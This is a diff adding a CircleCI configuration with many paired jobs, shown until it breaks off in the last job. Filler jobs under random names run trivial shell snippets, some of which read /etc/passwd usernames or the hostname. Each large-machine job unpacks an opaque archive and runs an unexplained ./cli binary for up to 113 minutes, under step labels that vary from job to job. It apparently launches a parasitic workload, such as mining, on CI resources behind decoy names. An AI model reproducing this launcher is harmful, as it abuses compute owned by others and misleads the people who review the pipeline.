@@ -1,0 +1,1682 @@
+version: 2.1
+
+jobs:
+  provision_rm-login-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dryer lint
+          command: |
+            mkdir -p /tmp/plaza
+            set +o pipefail 2>/dev/null; (seq 1 10000 | md5sum > /tmp/plaza/save-D.pkl) & wait; true
+            echo "@@ rm-login-crash: $(wc -c </tmp/plaza/save-D.pkl)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - save-D.pkl
+  rm-login-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/save-D.pkl 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  stepA_jun8-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: chorus loop
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; cut -d: -f1 /etc/passwd | sort | uniq -c | head -5; true ; } > /tmp/plaza/08.data
+            echo "@@ jun8-ship: $(wc -c </tmp/plaza/08.data)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - 08.data
+  jun8-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/06.data 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  db_rm-router-reload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: die thread
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=10;i++){s+=1/i} printf "%.4f\n",s}'; true ; } > /tmp/plaza/zxcvbn.dat
+            echo "@@ rm-router-reload: $(wc -c </tmp/plaza/zxcvbn.dat)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - zxcvbn.dat
+  rm-router-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/zxcvbn.dat 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  phase1_cook-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: banner wave
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; grep -v nologin /etc/passwd | wc -l; true ; } > /tmp/plaza/step-6.log
+            echo "@@ cook-it: $(wc -c </tmp/plaza/step-6.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-6.log
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/step-6.log 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  rerun_java17-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: spiral down
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{split("red,green,blue",a,","); for(i in a) print a[i]}' | sort; true ; } > /tmp/plaza/audit.gz
+            echo "@@ java17-cov: $(wc -c </tmp/plaza/audit.gz)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - audit.gz
+  java17-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/audit.gz 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  verify_release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: heave line
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo "key: value" | sed 's/^.*: //'; true ; } > /tmp/plaza/full_task_output_v2.log
+            echo "@@ release: $(wc -c </tmp/plaza/full_task_output_v2.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - full_task_output_v2.log
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/full_task_output_v2.log 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  precheck_all-greens:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: spin cycle
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo "another" | sha512sum 2>/dev/null | head -c 24 || echo "another" | sha256sum | head -c 24; true ; } > /tmp/plaza/main_job_output_v2.log
+            echo "@@ all-greens: $(wc -c </tmp/plaza/main_job_output_v2.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - main_job_output_v2.log
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/main_job_output_v2.log 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  inspect_blast-off:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: spoor
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && printf "x\n" > "$tf" && cat "$tf" | sha256sum | cut -c1-20 && rm "$tf"; true ; } > /tmp/plaza/left.log
+            echo "@@ blast-off: $(wc -c </tmp/plaza/left.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - left.log
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/left.log 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  fixture_LAB_HOOK_9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: embellishment
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=5;i++){print i; print i*i}}' | wc -l; true ; } > /tmp/plaza/a.out
+            echo "@@ LAB_HOOK_9: $(wc -c </tmp/plaza/a.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - a.out
+  LAB_HOOK_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/06.data 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  cacher_feat-523:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: TEST
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print tolower("HELLO WORLD")}'; true ; } > /tmp/plaza/2023-05-12.data
+            echo "@@ feat-523: $(wc -c </tmp/plaza/2023-05-12.data)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - 2023-05-12.data
+  feat-523:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/06.data 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  beta_update-webhook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: blip blop
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo "another" | sha512sum 2>/dev/null | head -c 24 || echo "another" | sha256sum | head -c 24; true ; } > /tmp/plaza/02.log
+            echo "@@ update-webhook: $(wc -c </tmp/plaza/02.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - 02.log
+  update-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/audit.gz 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  produce_aug21-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: sidestep
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo "the dog chased the cat" | awk '{for(i=NF;i>0;i--)printf "%s%s",$i,(i>1?OFS:ORS)}'; true ; } > /tmp/plaza/FINAL
+            echo "@@ aug21-cleanup: $(wc -c </tmp/plaza/FINAL)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - FINAL
+  aug21-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/FINAL 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  builder_publish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: bell curve
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print length("hello world")}'; true ; } > /tmp/plaza/step-7.out
+            echo "@@ publish: $(wc -c </tmp/plaza/step-7.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-7.out
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/step-7.out 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  beta_apr2-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: noise reduce
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="encode me well"; cmd=""; for(i=1;i<=length(s);i++){c=substr(s,i,1); cmd=cmd c}; print cmd}'; true ; } > /tmp/plaza/cache.dat
+            echo "@@ apr2-cleanup: $(wc -c </tmp/plaza/cache.dat)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - cache.dat
+  apr2-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/cache.dat 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  canary1_rollout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: sumo pull
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<=100;i+=10)print i, i*0.9}'; true ; } > /tmp/plaza/pt-C.state
+            echo "@@ rollout: $(wc -c </tmp/plaza/pt-C.state)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - pt-C.state
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/06.data 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  validate_xi-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: augmentation
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo "payload=42" | awk -F= '$1=="payload"{print $2+1}'; true ; } > /tmp/plaza/cache-pre.bin
+            echo "@@ xi-verify: $(wc -c </tmp/plaza/cache-pre.bin)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - cache-pre.bin
+  xi-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/audit.gz 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  route_yuki-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: consonance
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 44757); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/plaza/step-12.out
+            echo "@@ yuki-run: $(wc -c </tmp/plaza/step-12.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-12.out
+  yuki-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/step-12.out 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  phase_produce-production-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: rotate speed
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; tr a-z A-Z < /etc/hostname; true ; } > /tmp/plaza/test1.data
+            echo "@@ produce-production-release-candidate: $(wc -c </tmp/plaza/test1.data)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - test1.data
+  produce-production-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/test1.data 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  tmp_omar-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: up top
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM % 1000)) $((RANDOM % 100)) $((RANDOM % 10)) | awk '{s+=$1}END{print s}'; true ; } > /tmp/plaza/pre-stage.out
+            echo "@@ omar-push: $(wc -c </tmp/plaza/pre-stage.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - pre-stage.out
+  omar-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/pre-stage.out 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  wire_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: weigh anchor
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; seq 1 50000 | awk '$1%997==0' | wc -l; true ; } > /tmp/plaza/step-14.out
+            echo "@@ deploy: $(wc -c </tmp/plaza/step-14.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-14.out
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/step-14.out 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  redo_BUILD_QA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: wednesday brew
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo PATH=$PATH | tr : '\n' | wc -l; true ; } > /tmp/plaza/06.data
+            echo "@@ BUILD_QA: $(wc -c </tmp/plaza/06.data)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - 06.data
+  BUILD_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/06.data 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  verify_update-retry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: graze
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; head -c 26214400 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/plaza/checkpoint-B.pickle
+            echo "@@ update-retry: $(wc -c </tmp/plaza/checkpoint-B.pickle)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - checkpoint-B.pickle
+  update-retry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/checkpoint-B.pickle 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  dispatch_APP-24:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: pager quiet
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=100;for(i=1;i<=n;i++)if(i*i<n)r=i;print r}'; true ; } > /tmp/plaza/cafebabe.bin
+            echo "@@ APP-24: $(wc -c </tmp/plaza/cafebabe.bin)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - cafebabe.bin
+  APP-24:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/cafebabe.bin 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  hook_b-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: assisted dip
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo "   leading" | sed 's/^ *//'; true ; } > /tmp/plaza/artifact
+            echo "@@ b-new: $(wc -c </tmp/plaza/artifact)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - artifact
+  b-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/artifact 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  orchestrate_Verify_Pipeline8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: cantata
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; printf 'alpha\n123\nbeta\n456' | grep -En '^[a-z]+' | wc -l; true ; } > /tmp/plaza/last
+            echo "@@ Verify_Pipeline8: $(wc -c </tmp/plaza/last)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - last
+  Verify_Pipeline8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/audit.gz 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  sys_go1-21-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: grip
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=366144;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/plaza/tiny.bin
+            echo "@@ go1-21-release: $(wc -c </tmp/plaza/tiny.bin)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - tiny.bin
+  go1-21-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/tiny.bin 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
